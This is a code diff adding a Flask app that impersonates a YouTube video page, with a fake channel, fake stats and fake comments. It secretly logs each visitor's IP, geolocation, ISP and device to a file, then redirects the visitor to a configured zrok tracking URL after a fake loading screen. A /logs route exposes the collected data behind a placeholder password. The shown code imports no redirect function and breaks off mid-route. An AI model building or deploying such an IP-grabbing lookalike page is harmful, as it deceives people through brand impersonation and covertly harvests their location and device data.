@@ -1,0 +1,687 @@
+from flask import Flask, request, render_template_string
+import datetime
+import requests
+import ipaddress
+from user_agents import parse
+
+app = Flask(__name__)
+
+# ============================================
+# CONFIGURATION
+# ============================================
+# Change this to your actual tracking URL (zrok/ngrok)
+REDIRECT_URL = 'https://93gwjefditbl.share.zrok.io'
+
+# YouTube video ID for thumbnail (Rick Astley - Never Gonna Give You Up)
+VIDEO_ID = 'dQw4w9WgXcQ'
+VIDEO_TITLE = '🔥 AMAZING VIDEO - You Won\'t Believe This!'
+CHANNEL_NAME = 'TechMaster Pro'
+CHANNEL_SUBSCRIBERS = '2.4M subscribers'
+VIEWS = '1.2M views'
+UPLOAD_DATE = '3 days ago'
+LIKES = '45K'
+DISLIKES = '123'
+COMMENTS = '2.3K comments'
+
+# ============================================
+# HELPER FUNCTIONS
+# ============================================
+
+def is_private_ip(ip):
+    """Check if IP is private/local"""
+    try:
+        # Check for localhost
+        if ip == '127.0.0.1' or ip == '0.0.0.0' or ip == '::1':
+            return True
+        return ipaddress.ip_address(ip).is_private
+    except:
+        return True
+
+def get_geo(ip):
+    """Get geolocation from IP address"""
+    if is_private_ip(ip):
+        return "Local/Private IP"
+    
+    try:
+        res = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,message,city,country,isp,org",
+            timeout=5
+        )
+        data = res.json()
+        
+        if data.get('status') == 'success':
+            city = data.get('city', 'Unknown')
+            country = data.get('country', 'Unknown')
+            isp = data.get('isp', '')
+            org = data.get('org', '')
+            
+            location = f"{city}, {country}"
+            if isp:
+                location += f" | ISP: {isp}"
+            
+            return location
+        else:
+            return f"API Error: {data.get('message', 'Unknown')}"
+    except Exception as e:
+        print(f"Geo error: {e}")
+        return "Location unavailable"
+
+def get_real_ip():
+    """Get real IP even behind proxy/zrok"""
+    forwarded = request.headers.get('X-Forwarded-For')
+    if forwarded:
+        return forwarded.split(',')[0].strip()
+    
+    real_ip = request.headers.get('X-Real-IP')
+    if real_ip:
+        return real_ip
+    
+    cf_ip = request.headers.get('CF-Connecting-IP')
+    if cf_ip:
+        return cf_ip
+    
+    return request.remote_addr
+
+# ============================================
+# YOUTUBE LOOKALIKES
+# ============================================
+
+# YouTube Dark Theme
+YOUTUBE_DARK_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ video_title }} - YouTube</title>
+    <link rel="icon" href="https://www.youtube.com/favicon.ico">
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+        body { 
+            font-family: 'Roboto', Arial, sans-serif; 
+            background: #0f0f0f; 
+            color: #f1f1f1;
+            min-height: 100vh;
+        }
+        
+        /* Header */
+        .header {
+            background: #202020;
+            padding: 8px 24px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid #333;
+            height: 56px;
+        }
+        .logo {
+            color: #ff0000;
+            font-size: 22px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .logo span { 
+            color: #f1f1f1; 
+            margin-left: 2px;
+        }
+        .search {
+            flex: 1;
+            max-width: 600px;
+            display: flex;
+        }
+        .search input {
+            width: 100%;
+            padding: 8px 16px;
+            border: 1px solid #303030;
+            border-radius: 20px 0 0 20px;
+            background: #121212;
+            color: #f1f1f1;
+            font-size: 14px;
+            outline: none;
+        }
+        .search input:focus {
+            border-color: #1a73e8;
+        }
+        .search button {
+            padding: 8px 20px;
+            border: 1px solid #303030;
+            border-left: none;
+            border-radius: 0 20px 20px 0;
+            background: #303030;
+            color: #f1f1f1;
+            cursor: pointer;
+        }
+        .search button:hover {
+            background: #404040;
+        }
+        
+        /* Layout */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px;
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 24px;
+        }
+        
+        /* Main Video */
+        .player {
+            background: #000;
+            position: relative;
+            padding: 56.25% 0 0 0;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        .player img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            background: rgba(255,0,0,0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            animation: pulse 2s infinite;
+        }
+        .play-button:hover {
+            background: rgba(255,0,0,1);
+            transform: translate(-50%, -50%) scale(1.1);
+        }
+        .play-button::after {
+            content: "▶";
+            font-size: 36px;
+            color: white;
+            margin-left: 6px;
+        }
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.05); }
+            100% { transform: translate(-50%, -50%) scale(1); }
+        }
+        
+        /* Video Info */
+        .video-info {
+            margin-top: 16px;
+        }
+        .video-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .video-stats {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 12px 0;
+            border-top: 1px solid #333;
+            border-bottom: 1px solid #333;
+        }
+        .channel-avatar {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff0000, #ff6b6b);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+        }
+        .channel-name {
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .channel-subs {
+            color: #aaa;
+            font-size: 13px;
+        }
+        .subscribe-btn {
+            margin-left: auto;
+            padding: 8px 16px;
+            background: #cc0000;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .subscribe-btn:hover {
+            background: #ff0000;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .action-btn {
+            padding: 8px 16px;
+            background: #272727;
+            border: none;
+            border-radius: 20px;
+            color: #f1f1f1;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+        .action-btn:hover {
+            background: #3a3a3a;
+        }
+        .action-btn.like {
+            color: #3ea6ff;
+        }
+        
+        /* Comments */
+        .comments-section {
+            margin-top: 24px;
+        }
+        .comments-section h3 {
+            font-size: 16px;
+            margin-bottom: 16px;
+        }
+        .comment {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .comment-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #2a2a2a;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #aaa;
+        }
+        .comment-author {
+            font-weight: 600;
+            font-size: 13px;
+        }
+        .comment-text {
+            font-size: 14px;
+            color: #ddd;
+            margin-top: 2px;
+        }
+        .comment-time {
+            color: #888;
+            font-size: 12px;
+        }
+        
+        /* Sidebar */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .sidebar-item {
+            display: flex;
+            gap: 12px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
+        }
+        .sidebar-item:hover {
+            background: #272727;
+        }
+        .sidebar-thumb {
+            width: 168px;
+            height: 94px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .sidebar-thumb img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .sidebar-title {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        .sidebar-channel {
+            font-size: 12px;
+            color: #aaa;
+        }
+        
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .loading-overlay.show {
+            display: flex;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #333;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 18px;
+            color: #f1f1f1;
+        }
+        .loading-sub {
+            font-size: 14px;
+            color: #888;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+                padding: 12px;
+            }
+            .sidebar {
+                display: none;
+            }
+            .search {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay show" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">⏳ Loading video...</div>
+        <div class="loading-sub">This will only take a moment</div>
+        <div style="font-size:12px; color:#666; margin-top:20px;">
+            ⚡ <span id="timer">3</span>s
+        </div>
+    </div>
+    
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">▶<span>YouTube</span></div>
+        <div class="search">
+            <input type="text" placeholder="Search" value="{{ video_title|truncate(30) }}">
+            <button>🔍</button>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Left Column -->
+        <div>
+            <div class="player">
+                <img src="https://img.youtube.com/vi/{{ video_id }}/maxresdefault.jpg" alt="Video thumbnail">
+                <div class="play-button"></div>
+            </div>
+            
+            <div class="video-info">
+                <h1 class="video-title">{{ video_title }}</h1>
+                
+                <div class="video-stats">
+                    <span>{{ views }}</span>
+                    <span>•</span>
+                    <span>{{ upload_date }}</span>
+                </div>
+                
+                <div class="channel-info">
+                    <div class="channel-avatar">{{ channel_name[0] }}</div>
+                    <div>
+                        <div class="channel-name">{{ channel_name }}</div>
+                        <div class="channel-subs">{{ channel_subs }}</div>
+                    </div>
+                    <button class="subscribe-btn">Subscribe</button>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="action-btn like">👍 {{ likes }}</button>
+                    <button class="action-btn">👎 {{ dislikes }}</button>
+                    <button class="action-btn">🔗 Share</button>
+                    <button class="action-btn">💬 {{ comments }}</button>
+                </div>
+            </div>
+            
+            <!-- Comments -->
+            <div class="comments-section">
+                <h3>💬 {{ comments }} Comments</h3>
+                
+                <div class="comment">
+                    <div class="comment-avatar">J</div>
+                    <div>
+                        <div class="comment-author">JohnDoe_123</div>
+                        <div class="comment-text">This is absolutely amazing! 🔥🔥🔥</div>
+                        <div class="comment-time">2 hours ago</div>
+                    </div>
+                </div>
+                
+                <div class="comment">
+                    <div class="comment-avatar">S</div>
+                    <div>
+                        <div class="comment-author">SarahTech</div>
+                        <div class="comment-text">Best video I've seen this year! 🙌</div>
+                        <div class="comment-time">5 hours ago</div>
+                    </div>
+                </div>
+                
+                <div class="comment">
+                    <div class="comment-avatar">M</div>
+                    <div>
+                        <div class="comment-author">Mike_Pro</div>
+                        <div class="comment-text">Where can I find more content like this?</div>
+                        <div class="comment-time">1 day ago</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-item">
+                <div class="sidebar-thumb">
+                    <img src="https://img.youtube.com/vi/2Vv-BfVoq4g/mqdefault.jpg" alt="Video">
+                </div>
+                <div>
+                    <div class="sidebar-title">Another Amazing Video!</div>
+                    <div class="sidebar-channel">TechMaster Pro</div>
+                    <div class="sidebar-channel">1.8M views</div>
+                </div>
+            </div>
+            
+            <div class="sidebar-item">
+                <div class="sidebar-thumb">
+                    <img src="https://img.youtube.com/vi/9bZkp7q19f0/mqdefault.jpg" alt="Video">
+                </div>
+                <div>
+                    <div class="sidebar-title">Music Video 2024</div>
+                    <div class="sidebar-channel">Music World</div>
+                    <div class="sidebar-channel">3.2M views</div>
+                </div>
+            </div>
+            
+            <div class="sidebar-item">
+                <div class="sidebar-thumb">
+                    <img src="https://img.youtube.com/vi/6Dh-RL__uN4/mqdefault.jpg" alt="Video">
+                </div>
+                <div>
+                    <div class="sidebar-title">Tech Review 2024</div>
+                    <div class="sidebar-channel">ReviewTech</div>
+                    <div class="sidebar-channel">890K views</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Timer for redirect
+        let seconds = 3;
+        const timerElement = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            seconds--;
+            if (timerElement) {
+                timerElement.textContent = seconds;
+            }
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                // Redirect to the tracking URL
+                window.location.href = '{{ redirect_url }}';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
+"""
+
+# ============================================
+# MAIN ROUTES
+# ============================================
+
+@app.route('/')
+def index():
+    """Main YouTube lookalike page"""
+    
+    # Get real IP
+    ip = get_real_ip()
+    geo = get_geo(ip)
+    user_agent_string = request.headers.get('User-Agent', 'Unknown')
+    ua = parse(user_agent_string)
+    
+    # Device info
+    device = ua.device.family
+    os = ua.os.family
+    browser = ua.browser.family
+    device_info = f"{device} ({os})"
+    
+    # Timestamp
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Log everything (stealth)
+    log_entry = f"""========================================
+[{timestamp}] 
+IP: {ip}
+Geo: {geo}
+Device: {device_info}
+Browser: {browser}
+User-Agent: {user_agent_string[:100]}...
+========================================
+"""
+    
+    with open("ip_logs.txt", "a") as f:
+        f.write(log_entry)
+    
+    # Also log to console
+    print(f"[{timestamp}] YouTube page visited | IP: {ip} | Geo: {geo} | Device: {device_info}")
+    
+    # Render YouTube lookalike
+    return render_template_string(
+        YOUTUBE_DARK_TEMPLATE,
+        video_id=VIDEO_ID,
+        video_title=VIDEO_TITLE,
+        channel_name=CHANNEL_NAME,
+        channel_subs=CHANNEL_SUBSCRIBERS,
+        views=VIEWS,
+        upload_date=UPLOAD_DATE,
+        likes=LIKES,
+        dislikes=DISLIKES,
+        comments=COMMENTS,
+        redirect_url=REDIRECT_URL
+    )
+
+@app.route('/watch')
+def watch():
+    """YouTube /watch?=v=xxxx endpoint"""
+    # Get video ID from URL parameter
+    video_id = request.args.get('v', VIDEO_ID)
+    # Redirect to main page with video ID
+    return redirect('/')
+
+@app.route('/debug')
+def debug():
+    """Debug endpoint to see all headers"""
+    headers = dict(request.headers)
+    html = """
+    <h2>YouTube Debug Information</h2>
+    <p><strong>Remote Addr:</strong> {}</p>
+    <p><strong>Detected Real IP:</strong> {}</p>
+    <p><strong>Is Private:</strong> {}</p>
+    <h3>All Headers:</h3>
+    <ul>
+    """.format(
+        request.remote_addr,
+        get_real_ip(),
+        is_private_ip(get_real_ip())
+    )
+    
+    for key, value in headers.items():
+        html += f"<li><strong>{key}:</strong> {value}</li>"
+    html += "</ul>"
+    
+    return html
+
+@app.route('/logs')
+def view_logs():
+    """View logs (password protected)"""
+    # Simple password protection
+    auth = request.headers.get('Authorization')
+    if not auth or auth != 'Bearer your-secret-password':
+        return "Unauthorized", 401
+    
+    try:
+        with open("ip_logs.txt", "r") as f:
+            logs = f.read()
+
+ 
